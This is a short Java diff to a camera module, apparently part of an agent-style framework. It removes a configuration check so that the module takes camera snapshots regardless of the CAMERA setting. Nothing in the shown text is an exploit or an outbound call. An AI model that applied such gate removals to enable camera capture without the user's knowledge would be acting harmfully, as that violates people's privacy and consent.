@@ -60,13 +60,6 @@ public class ModuleCamera extends BaseInstantModule {
 		boolean force = conf.getBoolean("force", false);
 		boolean face = conf.getBoolean("face", false);
 
-		if (!Cfg.CAMERA) {
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " (parse), camera disabled by Cfg");
-			}
-			return false;
-		}
-
 		if (force) {
 			return checkCameraHardware();
 		}
@@ -89,13 +82,11 @@ public class ModuleCamera extends BaseInstantModule {
 
 	@Override
 	public void actualStart() {
-		if (Cfg.CAMERA) {
-			try {
-				snapshot();
-			} catch (IOException e) {
-				if (Cfg.DEBUG) {
-					Check.log(TAG + " (actualStart) Error: " + e);
-				}
+		try {
+			snapshot();
+		} catch (IOException e) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (actualStart) Error: " + e);
 			}
 		}
 	}
